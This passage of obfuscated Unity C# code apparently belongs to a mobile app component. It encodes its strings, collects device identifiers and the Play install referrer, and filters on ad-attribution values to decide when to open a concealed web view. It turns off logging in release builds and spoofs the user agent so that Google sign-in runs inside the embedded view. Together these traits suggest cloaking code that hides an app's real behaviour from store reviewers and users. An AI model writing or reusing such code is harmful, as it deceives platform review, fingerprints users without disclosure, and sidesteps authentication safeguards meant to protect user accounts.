        var _0x80e922ec = ReadPushField(_0x19fc2b2f, _0x9fe415a8._0x073f6504(new byte[3] { 151, 144, 142 }, 226));
        if (string.IsNullOrWhiteSpace(_0x80e922ec))
            return;
        _0x80e922ec = _0x80e922ec.Trim();
        if (!IsHttpUrl(_0x80e922ec))
            return;
        if (string.Equals(_0x80e922ec, _0x8622bb84, StringComparison.Ordinal))
            return;
        _0x8622bb84 = _0x80e922ec;
        OpenUrlExternally(_0x80e922ec);
    }

    private IEnumerator _0xe523a915()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[26] { 135, 136, 185, 175, 168, 129, 252, 149, 178, 181, 168, 181, 189, 176, 181, 166, 185, 142, 185, 186, 186, 185, 174, 185, 174, 252 }, 220));
            }
#endif
        }

        bool _0xfd97e154 = false;
        InstallReferrer.GetReferrer((_0x3f79da3a) =>
        {
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[24] { 255, 240, 193, 215, 208, 132, 246, 193, 194, 193, 214, 214, 193, 214, 249, 132, 195, 193, 208, 132, 70, 34, 54, 132 }, 164) + _0xf1265ea3);
            if (_0x3f79da3a.IsSuccess)
            {
                _0xf1265ea3 = _0x3f79da3a.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[28] { 10, 5, 52, 34, 37, 113, 3, 52, 55, 52, 35, 35, 52, 35, 12, 113, 2, 36, 50, 50, 52, 34, 34, 113, 179, 215, 195, 113 }, 81) + _0xf1265ea3);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[27] { 132, 139, 186, 172, 171, 255, 141, 186, 185, 186, 173, 173, 186, 173, 130, 255, 153, 190, 182, 179, 186, 187, 255, 61, 89, 77, 255 }, 223) + _0x3f79da3a);
#endif
                }

                _0xf1265ea3 = "";
            }

            _0x4d4d4a01 = true;
        });
        StartCoroutine(_0x105f5a6a(2f));
        yield return new WaitUntil(() => _0x4d4d4a01);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xf1265ea3}");
#endif
        }

        bool _0xc2a6739f = _0xf1265ea3.Contains(_0x9fe415a8._0x073f6504(new byte[6] { 101, 97, 110, 107, 102, 63 }, 2));
        _0xfd97e154 = _0xc2a6739f || _0xf1265ea3.Contains(_0x9fe415a8._0x073f6504(new byte[18] { 147, 130, 130, 129, 220, 155, 156, 129, 134, 147, 149, 128, 147, 159, 220, 145, 157, 159 }, 242)) || _0xf1265ea3.Contains(_0x9fe415a8._0x073f6504(new byte[17] { 165, 180, 180, 183, 234, 162, 165, 167, 161, 166, 171, 171, 175, 234, 167, 171, 169 }, 196));
        _0x84a7737b = _0xc2a6739f ? "" : (_0xfd97e154 ? "" : _0x84a7737b);
        _0x84a7737b = _0x84a7737b ?? "";
        _0x7bd60ea3 = _0x7bd60ea3 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x84a7737b}");
#endif
        }
    }

    private AndroidJavaObject _0x85cf66dd { get; set; }

    internal bool ContainsIgnoreCase(string _0x448074ce, string _0xa4c6233d)
    {
        if (string.IsNullOrEmpty(_0x448074ce) || string.IsNullOrEmpty(_0xa4c6233d))
            return false;
        return _0x448074ce.IndexOf(_0xa4c6233d, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private Canvas _0xecccf3b3()
    {
        if (_0x6af48c5f != null)
            return _0x6af48c5f;
        var _0x0d851698 = gameObject.GetComponentInChildren<Canvas>();
        if (_0x0d851698 == null)
        {
            var _0xe4b584da = new GameObject(_0x9fe415a8._0x073f6504(new byte[6] { 92, 126, 113, 105, 126, 108 }, 31), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x0d851698 = _0xe4b584da.GetComponent<Canvas>();
            _0x0d851698.transform.SetParent(transform, false);
            _0x0d851698.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x6af48c5f = _0x0d851698;
        return _0x6af48c5f;
    }

    private int _0xa3b62801 = 0;
    private Action _0xc99067d5;
    private bool TryOpenExternalLikeChrome(string _0x75ddd158)
    {
        if (string.IsNullOrEmpty(_0x75ddd158))
            return false;
        if (_0x75ddd158.StartsWith(_0x9fe415a8._0x073f6504(new byte[9] { 41, 46, 52, 37, 46, 52, 122, 111, 111 }, 64), StringComparison.OrdinalIgnoreCase))
            return _0x6705c753(_0x75ddd158);
        if (_0x5e2761c8(_0x75ddd158))
            return _0xb4633e82(_0x75ddd158, null);
        if (!_0x75ddd158.StartsWith(_0x9fe415a8._0x073f6504(new byte[7] { 95, 67, 67, 71, 13, 24, 24 }, 55), StringComparison.OrdinalIgnoreCase) && !_0x75ddd158.StartsWith(_0x9fe415a8._0x073f6504(new byte[8] { 208, 204, 204, 200, 203, 130, 151, 151 }, 184), StringComparison.OrdinalIgnoreCase) && !_0x75ddd158.StartsWith(_0x9fe415a8._0x073f6504(new byte[11] { 98, 97, 108, 118, 119, 57, 97, 111, 98, 109, 104 }, 3), StringComparison.OrdinalIgnoreCase))
        {
            return _0x7ef3d485(_0x75ddd158);
        }

        return false;
    }

    internal bool IsAboutBlank(string _0xaa9832c2)
    {
        if (string.IsNullOrEmpty(_0xaa9832c2))
            return false;
        return _0xaa9832c2.StartsWith(_0x9fe415a8._0x073f6504(new byte[11] { 71, 68, 73, 83, 82, 28, 68, 74, 71, 72, 77 }, 38), StringComparison.OrdinalIgnoreCase);
    }

    private void _0x8fbbd0ec()
    {
        {
#if B_LOGS
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[22] { 233, 230, 215, 193, 198, 239, 146, 225, 198, 221, 192, 215, 246, 215, 196, 219, 209, 215, 251, 220, 212, 221 }, 178));
#endif
        }

        _0x31a75f61 = SystemInfo.deviceModel;
        _0x016470aa = Application.version;
        _0x52463fb4 = Application.installMode;
        _0x45aaa86e = Application.installerName;
        _0x7b1a35fe = Application.identifier;
        _0xb40641aa = _0x3d37a729();
        _0x6b737398 = _0xfac7fe89();
        _0x64712a8c = SystemInfo.deviceUniqueIdentifier;
        _0xe5849e05 = SystemInfo.graphicsDeviceName;
        _0xcbb35755 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x016470aa = _0x9fe415a8._0x073f6504(new byte[5] { 50, 43, 50, 43, 50 }, 5);
                _0x52463fb4 = ApplicationInstallMode.Store;
                _0x45aaa86e = _0x9fe415a8._0x073f6504(new byte[19] { 223, 211, 209, 146, 221, 210, 216, 206, 211, 213, 216, 146, 202, 217, 210, 216, 213, 210, 219 }, 188);
                _0x6b737398 = _0x9fe415a8._0x073f6504(new byte[8] { 105, 97, 124, 120, 117, 44, 121, 109 }, 12);
                _0x64712a8c = Guid.NewGuid().ToString().Replace(_0x9fe415a8._0x073f6504(new byte[1] { 17 }, 60), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[17] { 182, 185, 136, 158, 153, 176, 205, 137, 136, 155, 160, 130, 137, 136, 129, 215, 205 }, 237) + _0x31a75f61);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[19] { 7, 8, 57, 47, 40, 1, 124, 61, 44, 44, 10, 57, 46, 47, 53, 51, 50, 102, 124 }, 92) + _0x016470aa);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[20] { 143, 128, 177, 167, 160, 137, 244, 189, 186, 167, 160, 181, 184, 184, 153, 187, 176, 177, 238, 244 }, 212) + _0x52463fb4);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[23] { 24, 23, 38, 48, 55, 30, 99, 42, 45, 48, 55, 34, 47, 47, 38, 49, 16, 55, 44, 49, 38, 121, 99 }, 67) + _0x45aaa86e);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[14] { 53, 58, 11, 29, 26, 51, 78, 15, 30, 30, 39, 10, 84, 78 }, 110) + _0x7b1a35fe);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[14] { 211, 220, 237, 251, 252, 213, 168, 233, 236, 254, 193, 236, 178, 168 }, 136) + _0xb40641aa);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[18] { 100, 107, 90, 76, 75, 98, 31, 74, 76, 90, 77, 126, 88, 90, 81, 75, 5, 31 }, 63) + _0x6b737398);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[17] { 197, 202, 251, 237, 234, 195, 190, 237, 231, 237, 218, 251, 232, 215, 250, 164, 190 }, 158) + _0x64712a8c);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[12] { 51, 60, 13, 27, 28, 53, 72, 15, 24, 29, 82, 72 }, 104) + _0xe5849e05);
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[12] { 53, 58, 11, 29, 26, 51, 78, 13, 30, 27, 84, 78 }, 110) + _0xcbb35755);
#endif
        }
    }

    private void _0xb7785d52(string _0x75c72b58)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[34] { 38, 41, 24, 14, 9, 32, 93, 59, 24, 9, 30, 21, 93, 56, 5, 9, 15, 28, 93, 45, 8, 14, 21, 93, 57, 28, 9, 28, 93, 47, 28, 10, 71, 93 }, 125) + _0x75c72b58);
#endif
            }
        }

        var _0x3ccc9941 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x75c72b58);
        StartCoroutine(_0x9eeac110(_0x3ccc9941));
    }

    private bool _0x701429b2 = false;
    private void _0x1549b977()
    {
        if (_0x9b2fb3b8 != null)
            return;
        var _0xce495593 = _0xecccf3b3();
        _0x9b2fb3b8 = new GameObject(_0x9fe415a8._0x073f6504(new byte[14] { 182, 132, 131, 183, 136, 132, 150, 178, 145, 136, 143, 143, 132, 147 }, 225), typeof(RectTransform), typeof(Text));
        _0xbb1dcbc3 = _0x9b2fb3b8.GetComponent<RectTransform>();
        _0xbb1dcbc3.SetParent(_0xce495593.transform, false);
        _0xbb1dcbc3.anchorMin = new Vector2(0.5f, 0.5f);
        _0xbb1dcbc3.anchorMax = new Vector2(0.5f, 0.5f);
        _0xbb1dcbc3.pivot = new Vector2(0.5f, 0.5f);
        _0xbb1dcbc3.sizeDelta = new Vector2(600f, 600f);
        _0xbb1dcbc3.anchoredPosition = Vector2.zero;
        _0x97455ce0 = _0x9b2fb3b8.GetComponent<Text>();
        _0x97455ce0.text = _0x9fe415a8._0x073f6504(new byte[1] { 59 }, 20);
        _0x97455ce0.font = Resources.GetBuiltinResource<Font>(_0x9fe415a8._0x073f6504(new byte[17] { 175, 134, 132, 130, 128, 154, 177, 150, 141, 151, 138, 142, 134, 205, 151, 151, 133 }, 227));
        _0x97455ce0.fontSize = 200;
        _0x97455ce0.alignment = TextAnchor.MiddleCenter;
        _0x97455ce0.color = Color.white;
        _0x97455ce0.raycastTarget = false;
        _0x9b2fb3b8.SetActive(false);
    }

    private void WLog(string _0x453c1202)
    {
#if B_LOGS
        {
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[7] { 247, 248, 201, 223, 216, 241, 140 }, 172) + _0x453c1202);
        }
#endif
    }

    private void _0xfaa9cd3e(string _0xe7ea419f)
    {
        if (string.IsNullOrEmpty(_0xe7ea419f))
            return;
        if (TryOpenExternalLikeChrome(_0xe7ea419f))
            return;
        OpenUrlExternally(_0xe7ea419f);
    }

    private readonly string[] _0x5d79989f = new string[]
    {
        _0x9fe415a8._0x073f6504(new byte[60] { 107, 4, 21, 43, 187, 207, 243, 254, 187, 233, 254, 254, 247, 232, 187, 250, 233, 254, 187, 243, 244, 239, 187, 233, 242, 252, 243, 239, 187, 245, 244, 236, 187, 121, 27, 8, 187, 255, 244, 245, 121, 27, 2, 239, 187, 246, 242, 232, 232, 187, 226, 244, 238, 233, 187, 232, 235, 242, 245, 186 }, 155),
        _0x9fe415a8._0x073f6504(new byte[52] { 184, 215, 197, 200, 104, 1, 60, 104, 43, 39, 61, 36, 44, 104, 42, 45, 104, 49, 39, 61, 58, 104, 36, 61, 43, 35, 49, 104, 37, 39, 37, 45, 38, 60, 104, 170, 200, 219, 104, 63, 32, 49, 104, 59, 60, 39, 56, 104, 38, 39, 63, 119 }, 72),
        _0x9fe415a8._0x073f6504(new byte[66] { 105, 17, 42, 100, 51, 4, 171, 201, 226, 236, 171, 252, 226, 229, 248, 171, 234, 249, 238, 171, 227, 226, 255, 255, 226, 229, 236, 171, 230, 228, 249, 238, 171, 228, 237, 255, 238, 229, 171, 255, 228, 239, 234, 242, 171, 105, 11, 24, 171, 248, 255, 234, 242, 171, 226, 229, 171, 255, 227, 238, 171, 236, 234, 230, 238, 165 }, 139),
        _0x9fe415a8._0x073f6504(new byte[54] { 109, 2, 8, 15, 189, 201, 245, 244, 238, 189, 244, 238, 189, 237, 239, 244, 240, 248, 189, 233, 244, 240, 248, 189, 127, 29, 14, 189, 233, 245, 248, 189, 255, 248, 238, 233, 189, 237, 241, 252, 228, 248, 239, 238, 189, 237, 241, 252, 228, 189, 243, 242, 234, 179 }, 157),
        _0x9fe415a8._0x073f6504(new byte[48] { 166, 201, 194, 243, 118, 15, 57, 35, 36, 118, 33, 63, 56, 56, 63, 56, 49, 118, 37, 34, 36, 51, 55, 61, 118, 53, 57, 35, 58, 50, 118, 52, 51, 118, 57, 56, 51, 118, 37, 38, 63, 56, 118, 55, 33, 55, 47, 120 }, 86),
        _0x9fe415a8._0x073f6504(new byte[65] { 77, 34, 39, 61, 157, 247, 220, 222, 214, 205, 210, 201, 206, 157, 220, 207, 216, 157, 208, 210, 207, 216, 157, 220, 222, 201, 212, 203, 216, 157, 201, 210, 211, 212, 218, 213, 201, 157, 95, 61, 46, 157, 206, 201, 220, 196, 157, 220, 211, 217, 157, 201, 207, 196, 157, 196, 210, 200, 207, 157, 209, 200, 222, 214, 147 }, 189),
        _0x9fe415a8._0x073f6504(new byte[55] { 141, 226, 243, 207, 93, 56, 11, 24, 15, 4, 93, 14, 13, 20, 19, 93, 30, 18, 8, 19, 9, 14, 93, 159, 253, 238, 93, 9, 21, 24, 93, 19, 24, 5, 9, 93, 18, 19, 24, 93, 30, 18, 8, 17, 25, 93, 31, 24, 93, 4, 18, 8, 15, 14, 83 }, 125),
        _0x9fe415a8._0x073f6504(new byte[63] { 109, 34, 31, 96, 55, 0, 175, 223, 227, 238, 246, 234, 253, 252, 175, 253, 230, 232, 231, 251, 175, 225, 224, 248, 175, 238, 253, 234, 175, 248, 230, 225, 225, 230, 225, 232, 175, 109, 15, 28, 175, 235, 224, 225, 109, 15, 22, 251, 175, 248, 238, 227, 228, 175, 238, 248, 238, 246, 175, 246, 234, 251, 161 }, 143),
        _0x9fe415a8._0x073f6504(new byte[51] { 164, 203, 219, 210, 116, 27, 58, 56, 45, 116, 32, 60, 59, 39, 49, 116, 35, 60, 59, 116, 39, 32, 53, 45, 116, 61, 58, 116, 32, 60, 49, 116, 51, 53, 57, 49, 116, 35, 61, 58, 116, 32, 60, 49, 116, 36, 38, 61, 46, 49, 122 }, 84),
        _0x9fe415a8._0x073f6504(new byte[64] { 24, 96, 91, 21, 66, 117, 218, 183, 149, 151, 159, 148, 142, 143, 151, 218, 147, 137, 218, 159, 140, 159, 136, 131, 142, 146, 147, 148, 157, 218, 24, 122, 105, 218, 145, 159, 159, 138, 218, 137, 138, 147, 148, 148, 147, 148, 157, 218, 156, 149, 136, 218, 131, 149, 143, 136, 218, 153, 146, 155, 148, 153, 159, 212 }, 250)
    };
    private string _0x03994315 = "";
    private void OnApplicationPause(bool _0x5b74f644)
    {
        isApplicationPause = _0x5b74f644;
    }

    private void _0x1142ece4(bool _0xe6cae483)
    {
        _0x1549b977();
        _0x9b2fb3b8.SetActive(_0xe6cae483);
        _0x8b9f28a6 = _0xe6cae483;
        if (_0xe6cae483)
        {
            _0x9b2fb3b8.transform.SetAsLastSibling();
            if (_0xbb1dcbc3 != null)
                _0xbb1dcbc3.localRotation = Quaternion.identity;
        }
    }

    private async Task _0x9ab495e9()
    {
        if (await _0x7cef395d())
            return;
        if (await _0x910363d5())
            return;
        if (await _0x72eedaa5())
            return;
        _0x8fbbd0ec();
        await _0xebae9a14(_0xe523a915());
        _0x2d16eae7 = await _0xee83bc02();
        await _0xcdb0841e();
    }

    private void OnApplicationFocus(bool _0x3d63fade)
    {
        isApplicationFocus = _0x3d63fade;
        if (_0x3d63fade && _0x9c09cacf)
        {
            _0x7fe9c80e();
        }
    }

    private int _0xdc66f729 = -1;
    private bool _0x4fa6443a = false;
    private bool OpenUrlExternally(string _0xfc3be370)
    {
        return _0x7ef3d485(_0xfc3be370);
    }

    private void Awake()
    {
        if (_0xdf32a2c3 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0xdf32a2c3 = gameObject.GetComponent<_0xde141cf2>();
        DontDestroyOnLoad(gameObject);
        _0xd6bcc363 = _0x84a7737b = _0x7bd60ea3 = "";
        _0xa70bcfc6 = "";
        _0x9c09cacf = false;
    }

    private string _0xe5849e05 = "";
    public void _0xf0a60d8f()
    {
        if (_0x9c09cacf)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[33] { 97, 110, 95, 73, 78, 103, 26, 110, 83, 87, 95, 72, 26, 85, 79, 78, 26, 23, 4, 26, 87, 85, 76, 95, 26, 78, 85, 26, 73, 89, 95, 84, 95 }, 58));
            }
#endif
        }

        _0x1b8962c6();
    }

    private void _0xc8c85c1d(UniWebView _0x3601a6fe)
    {
        if (_0x53bf7927)
            return;
        _0x53bf7927 = true;
        _0x3601a6fe.AddUrlScheme(_0x9fe415a8._0x073f6504(new byte[2] { 253, 238 }, 137));
        _0x3601a6fe.AddUrlScheme(_0x9fe415a8._0x073f6504(new byte[6] { 225, 230, 252, 237, 230, 252 }, 136));
        _0x3601a6fe.AddUrlScheme(_0x9fe415a8._0x073f6504(new byte[6] { 183, 187, 168, 177, 191, 174 }, 218));
        _0x3601a6fe.OnMessageReceived += (_0x3360cd34, _0x27898906) =>
        {
            if (TryOpenExternalLikeChrome(_0x27898906.RawMessage))
            {
                _0x1142ece4(false);
                return;
            }
        };
        _0x3601a6fe.RegisterShouldHandleRequest(_0x0d41c21e =>
        {
            string _0x93859e64 = _0x0d41c21e != null ? _0x0d41c21e.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x93859e64))
                return true;
            WLog(_0x9fe415a8._0x073f6504(new byte[21] { 9, 50, 53, 47, 54, 62, 18, 59, 52, 62, 54, 63, 8, 63, 43, 47, 63, 41, 46, 96, 122 }, 90) + _0x93859e64);
            if (TryOpenExternalLikeChrome(_0x93859e64))
            {
                _0x1142ece4(false);
                return false;
            }

            if (_0x0d41c21e != null && _0x0d41c21e.IsMainFrame && IsGoogleAuthFlowUrl(_0x93859e64) && !_0x4fa6443a)
            {
                WLog(_0x9fe415a8._0x073f6504(new byte[62] { 92, 112, 120, 127, 49, 70, 116, 115, 71, 120, 116, 102, 49, 117, 116, 101, 116, 114, 101, 116, 117, 49, 86, 126, 126, 118, 125, 116, 49, 112, 100, 101, 121, 49, 68, 67, 93, 49, 60, 47, 49, 99, 116, 125, 126, 112, 117, 49, 102, 120, 101, 121, 49, 86, 126, 126, 118, 125, 116, 49, 68, 80 }, 17));
                _0x4fa6443a = true;
                _0x1142ece4(true);
                _0x00eaf601.SetUserAgent(_0xad706657());
                _0x00eaf601.Load(_0x93859e64);
                return false;
            }

            return true;
        });
        _0x3601a6fe.OnLoadingErrorReceived += (_0x3360cd34, _0xe3d01218, _0x27898906, _0xd1f7d2f4) =>
        {
            WLog(_0x9fe415a8._0x073f6504(new byte[25] { 201, 229, 237, 234, 164, 211, 225, 230, 210, 237, 225, 243, 164, 193, 246, 246, 235, 246, 190, 164, 231, 235, 224, 225, 185 }, 132) + _0xe3d01218 + _0x9fe415a8._0x073f6504(new byte[9] { 125, 48, 56, 46, 46, 60, 58, 56, 96 }, 93) + _0x27898906);
            string _0xf3a5b8ab = GetFailingUrl(_0xd1f7d2f4);
            if (string.IsNullOrEmpty(_0xf3a5b8ab) || IsAboutBlank(_0xf3a5b8ab))
                return;
            _ = _0x088b9e09(_0x9fe415a8._0x073f6504(new byte[8] { 207, 206, 231, 221, 202, 202, 215, 202 }, 184));
            WLog(_0x9fe415a8._0x073f6504(new byte[45] { 214, 250, 242, 245, 187, 204, 254, 249, 205, 242, 254, 236, 187, 253, 250, 242, 247, 242, 245, 252, 187, 206, 201, 215, 187, 182, 165, 187, 244, 235, 254, 245, 187, 254, 227, 239, 254, 233, 245, 250, 247, 247, 226, 161, 187 }, 155) + _0xf3a5b8ab);
            StopCurrentFailedLoad(_0x3360cd34);
            _0xfaa9cd3e(_0xf3a5b8ab);
        };
        _0x3601a6fe.OnPageStarted += (_0x3360cd34, _0xb312f75f) =>
        {
            _0xa3b62801 = 0;
            if (_0x82605afc && IsAboutBlank(_0xb312f75f))
            {
                WLog(_0x9fe415a8._0x073f6504(new byte[27] { 94, 124, 107, 121, 111, 124, 99, 46, 111, 108, 97, 123, 122, 52, 108, 98, 111, 96, 101, 46, 125, 122, 111, 124, 122, 107, 106 }, 14));
                return;
            }

            WLog(_0x9fe415a8._0x073f6504(new byte[29] { 66, 110, 102, 97, 47, 88, 106, 109, 89, 102, 106, 120, 47, 64, 97, 95, 110, 104, 106, 92, 123, 110, 125, 123, 106, 107, 53, 47, 36 }, 15) + (Time.realtimeSinceStartup - _0x7bf40925).ToString(_0x9fe415a8._0x073f6504(new byte[5] { 169, 183, 169, 169, 169 }, 153)) + _0x9fe415a8._0x073f6504(new byte[2] { 68, 23 }, 55) + _0xb312f75f);
            if (TryOpenExternalLikeChrome(_0xb312f75f))
            {
                StopCurrentFailedLoad(_0x3360cd34);
                return;
            }

            if (ContainsIgnoreCase(_0xb312f75f, _0x9fe415a8._0x073f6504(new byte[8] { 172, 161, 161, 169, 230, 169, 184, 184 }, 200)) || ContainsIgnoreCase(_0xb312f75f, _0x9fe415a8._0x073f6504(new byte[15] { 208, 193, 217, 142, 215, 201, 196, 199, 197, 212, 142, 194, 204, 207, 199 }, 160)) || _0xb312f75f.StartsWith(_0x9fe415a8._0x073f6504(new byte[25] { 10, 22, 22, 18, 17, 88, 77, 77, 0, 18, 5, 14, 13, 0, 3, 14, 4, 3, 20, 76, 14, 11, 20, 7, 77 }, 98), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x3360cd34);
                OpenUrlExternally(_0xb312f75f);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0xb312f75f))
            {
                _0x1142ece4(true);
                WLog(_0x9fe415a8._0x073f6504(new byte[41] { 204, 228, 228, 236, 231, 238, 171, 234, 254, 255, 227, 171, 237, 231, 228, 252, 171, 239, 238, 255, 238, 232, 255, 238, 239, 171, 166, 181, 171, 224, 238, 238, 251, 171, 253, 226, 248, 226, 233, 231, 238 }, 139));
                return;
            }

            _0x701429b2 = true;
            _0x1142ece4(true);
            WLog(_0x9fe415a8._0x073f6504(new byte[43] { 0, 50, 53, 1, 62, 50, 32, 119, 59, 56, 54, 51, 62, 57, 48, 120, 37, 50, 51, 62, 37, 50, 52, 35, 62, 57, 48, 119, 122, 105, 119, 60, 50, 50, 39, 119, 33, 62, 36, 62, 53, 59, 50 }, 87));
        };
        _0x3601a6fe.OnPageCommitted += (_0x3360cd34, _0xb312f75f) =>
        {
            if (_0x82605afc && IsAboutBlank(_0xb312f75f))
                return;
            WLog(_0x9fe415a8._0x073f6504(new byte[31] { 237, 193, 201, 206, 128, 247, 197, 194, 246, 201, 197, 215, 128, 239, 206, 240, 193, 199, 197, 227, 207, 205, 205, 201, 212, 212, 197, 196, 154, 128, 139 }, 160) + (Time.realtimeSinceStartup - _0x7bf40925).ToString(_0x9fe415a8._0x073f6504(new byte[5] { 109, 115, 109, 109, 109 }, 93)) + _0x9fe415a8._0x073f6504(new byte[2] { 87, 4 }, 36) + _0xb312f75f);
            if (!firstLoadShown && IsHttpUrl(_0xb312f75f))
            {
                firstLoadShown = true;
                _0x701429b2 = false;
                _0x1142ece4(false);
                _0x5259bb2c();
                _0xe0cafdb9();
                _0x3360cd34.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x088b9e09(_0x9fe415a8._0x073f6504(new byte[9] { 164, 165, 140, 188, 163, 182, 189, 182, 183 }, 211));
                WLog(_0x9fe415a8._0x073f6504(new byte[39] { 27, 55, 63, 56, 118, 1, 51, 52, 0, 63, 51, 33, 118, 37, 62, 57, 33, 56, 118, 57, 56, 118, 53, 57, 59, 59, 63, 34, 34, 51, 50, 118, 53, 57, 56, 34, 51, 56, 34 }, 86));
            }
        };
        _0x3601a6fe.OnPageProgressChanged += (_0x3360cd34, _0xbd6f59d8) =>
        {
            if (_0x82605afc)
                return;
            if (!firstLoadShown && _0xbd6f59d8 >= 0.65f)
            {
                firstLoadShown = true;
                _0x701429b2 = false;
                _0x1142ece4(false);
                _0x5259bb2c();
                _0xe0cafdb9();
                _0x3360cd34.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x088b9e09(_0x9fe415a8._0x073f6504(new byte[9] { 253, 252, 213, 229, 250, 239, 228, 239, 238 }, 138));
                WLog(_0x9fe415a8._0x073f6504(new byte[32] { 38, 10, 2, 5, 75, 60, 14, 9, 61, 2, 14, 28, 75, 24, 3, 4, 28, 5, 75, 9, 18, 75, 27, 25, 4, 12, 25, 14, 24, 24, 81, 75 }, 107) + _0xbd6f59d8);
            }
        };
        _0x3601a6fe.OnPageFinished += (_0x3360cd34, _0xe3d01218, _0xb312f75f) =>
        {
            if (_0x82605afc && IsAboutBlank(_0xb312f75f))
            {
                _0x82605afc = false;
                WLog(_0x9fe415a8._0x073f6504(new byte[28] { 41, 11, 28, 14, 24, 11, 20, 89, 24, 27, 22, 12, 13, 67, 27, 21, 24, 23, 18, 89, 31, 16, 23, 16, 10, 17, 28, 29 }, 121));
                return;
            }

            WLog(_0x9fe415a8._0x073f6504(new byte[24] { 82, 126, 118, 113, 63, 72, 122, 125, 73, 118, 122, 104, 63, 89, 118, 113, 118, 108, 119, 122, 123, 37, 63, 52 }, 31) + (Time.realtimeSinceStartup - _0x7bf40925).ToString(_0x9fe415a8._0x073f6504(new byte[5] { 133, 155, 133, 133, 133 }, 181)) + _0x9fe415a8._0x073f6504(new byte[7] { 14, 93, 30, 18, 25, 24, 64 }, 125) + _0xe3d01218 + _0x9fe415a8._0x073f6504(new byte[5] { 81, 4, 3, 29, 76 }, 113) + _0xb312f75f);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x701429b2 = false;
                _0x1142ece4(false);
                _0x5259bb2c();
                _0xe0cafdb9();
                _0x3360cd34.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x088b9e09(_0x9fe415a8._0x073f6504(new byte[9] { 187, 186, 147, 163, 188, 169, 162, 169, 168 }, 204));
                WLog(_0x9fe415a8._0x073f6504(new byte[33] { 205, 225, 233, 238, 160, 215, 229, 226, 214, 233, 229, 247, 160, 230, 233, 242, 243, 244, 160, 236, 239, 225, 228, 160, 227, 239, 237, 240, 236, 229, 244, 229, 228 }, 128));
            }
            else if (_0x701429b2)
            {
                _0x701429b2 = false;
                _0x1142ece4(false);
                _0x3360cd34.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x9fe415a8._0x073f6504(new byte[40] { 5, 41, 33, 38, 104, 31, 45, 42, 30, 33, 45, 63, 104, 27, 32, 39, 63, 104, 41, 46, 60, 45, 58, 104, 36, 39, 41, 44, 33, 38, 47, 104, 46, 33, 38, 33, 59, 32, 45, 44 }, 72));
            }
            else
            {
                _0x1142ece4(false);
            }

            if (_0x4fa6443a && !IsGoogleAuthFlowUrl(_0xb312f75f) && !IsGoogleAuthFlowUrl(_0xb312f75f))
            {
                WLog(_0x9fe415a8._0x073f6504(new byte[48] { 115, 91, 91, 83, 88, 81, 20, 85, 65, 64, 92, 20, 71, 81, 81, 89, 71, 20, 82, 93, 90, 93, 71, 92, 81, 80, 20, 25, 10, 20, 70, 81, 71, 64, 91, 70, 81, 20, 80, 81, 82, 85, 65, 88, 64, 20, 97, 117 }, 52));
                _0x4fa6443a = false;
                _0x00eaf601.SetUserAgent("");
            }
        };
        _0x3601a6fe.OnShouldClose += _0x3360cd34 =>
        {
            WLog(_0x9fe415a8._0x073f6504(new byte[41] { 166, 169, 152, 142, 137, 160, 221, 176, 156, 148, 147, 221, 170, 152, 159, 171, 148, 152, 138, 221, 178, 147, 174, 149, 146, 136, 145, 153, 190, 145, 146, 142, 152, 221, 148, 147, 139, 146, 150, 152, 153 }, 253));
            _0x49acc03a();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x3601a6fe.SetPopupPageEventEnabled(true);
        bool _0x76c5c391 = false;
        bool _0xed0fca3f = false;
        _0x3601a6fe.OnMultipleWindowOpened += (_0x3360cd34, _0x2ed8b921) =>
        {
            _0x3360cd34.ScrollTo(0, 0, false);
            WLog(_0x9fe415a8._0x073f6504(new byte[43] { 237, 226, 211, 197, 194, 235, 150, 251, 215, 223, 216, 150, 225, 211, 212, 224, 223, 211, 193, 150, 251, 195, 218, 194, 223, 198, 218, 211, 225, 223, 216, 210, 217, 193, 150, 249, 198, 211, 216, 211, 210, 140, 150 }, 182) + _0x2ed8b921);
